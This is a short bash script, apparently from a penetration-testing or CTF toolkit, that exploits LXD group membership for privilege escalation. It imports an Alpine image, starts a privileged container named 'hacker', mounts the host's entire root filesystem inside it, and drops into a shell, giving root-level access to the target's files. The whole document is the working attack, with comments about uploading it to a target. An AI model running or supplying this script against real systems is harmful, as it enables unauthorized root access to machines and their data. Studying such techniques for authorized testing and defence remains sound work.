#!/bin/bash
#IMPORTANT!
#build first on host sudo ./build-alpine
#upload into target

lxc image import alpine-v3.12-x86_64-20200628_1503.tar.gz --alias image

sleep 5

lxc init image hacker -c security.privileged=true

sleep 4

lxc config device add hacker mydevice disk source=/ path=/mnt/root recursive=true

#check container list

lxc list

#root

lxc exec hacker /bin/sh
